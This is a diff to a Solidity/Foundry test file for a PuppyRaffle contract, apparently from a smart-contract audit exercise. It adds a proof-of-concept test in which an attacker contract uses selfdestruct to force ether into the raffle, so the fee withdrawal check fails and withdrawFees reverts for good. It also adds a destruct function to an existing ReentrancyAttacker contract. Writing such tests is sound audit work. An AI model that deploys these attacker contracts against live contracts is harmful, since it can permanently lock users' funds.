@@ -368,6 +368,37 @@ contract PuppyRaffleTest is Test {
         puppyRaffle.withdrawFees();
     }
 
+    function testCheckWithdrawalInoperability() public playersEntered {
+        address alice = makeAddr("alice");
+        deal(alice, 1 ether);
+
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+
+        // 0.8 ether -> totalFees
+        puppyRaffle.selectWinner();
+
+        console.log("Contract balance before attack: %s" ,address(puppyRaffle).balance);
+        console.log("Contract totalFees before attack: %s" ,puppyRaffle.totalFees());
+
+        vm.startPrank(alice);
+        ReentrancyAttacker attacker = new ReentrancyAttacker{value:1 ether}(address(puppyRaffle));
+        // Send 1 ether to puppy raffle through selfdestruct
+        attacker.destruct(address(puppyRaffle));
+        vm.stopPrank();
+
+        // Discrepancy
+        // contract balance: 1.8 ether. 
+        // Total fees: 0.8 ether.
+        console.log("Contract balance after attack: %s" ,address(puppyRaffle).balance);
+        console.log("Contract totalFees after attack: %s" ,puppyRaffle.totalFees());
+
+        assertLt(puppyRaffle.totalFees(), address(puppyRaffle).balance);
+
+        vm.expectRevert();
+        puppyRaffle.withdrawFees();
+    }
+
 }
 
 contract ReentrancyAttacker {
@@ -389,6 +420,10 @@ contract ReentrancyAttacker {
 
     function setIdx() external onlyOwner {
         idx = raffle.getActivePlayerIndex(address(this));
+    }
+
+    function destruct(address _address) external onlyOwner {
+        selfdestruct(payable(_address));
     }
 
     receive() external payable {
